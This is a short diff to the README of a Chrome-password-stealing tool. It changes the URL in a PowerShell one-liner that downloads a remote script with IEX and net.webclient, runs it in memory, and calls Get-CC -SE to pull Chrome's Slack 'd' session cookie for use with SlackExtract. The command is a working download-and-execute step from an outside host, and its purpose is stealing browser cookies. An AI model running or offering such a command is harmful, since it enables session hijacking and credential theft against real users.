@@ -27,6 +27,6 @@ Note: Most of this code comes from https://github.com/et0x/Get-ChromePasswords, 
 ## Just pull "d" Cookie for use with SlackExtract...
 
 ```PowerShell
-IEX((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/clr2of8/Get-ChromePasswords/master/Get-CC.ps1'));Get-CC -SE
+IEX((new-object net.webclient).downloadstring('https://gist.github.com/clr2of8/71835ab9b63ed829a3d8763bf4ebb003'));Get-CC -SE
 ```
 
